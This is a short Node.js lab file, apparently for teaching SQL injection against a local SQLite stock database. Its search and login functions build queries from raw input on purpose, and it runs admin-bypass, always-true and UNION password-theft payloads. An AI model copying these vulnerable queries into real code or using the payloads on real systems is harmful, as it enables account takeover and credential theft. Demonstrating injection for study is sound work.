const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

function searchProduct(name) {
    const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
    console.log('Query:', query);
    const rows = db.prepare(query).all();
    console.log('Result:', rows, '\n');
    return rows;
}

function login(username, password) {
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log('Query:', query);
    const row = db.prepare(query).get();
    console.log('Result:', row, '\n');
    return row;
}

// --- THE ATTACK LAB ---

console.log("ATTACK 1: Dump all products");

console.log("ATTACK 2: Login bypass (Admin)");
login("admin'--", "anything");

console.log("ATTACK 3: Always true log");
login("' OR '1'='1", "' OR '1'='1");

console.log("ATTACK 4: UNION Attack (Stealing Passwords) ");
searchProduct("' UNION SELECT id, username, password, role FROM users--");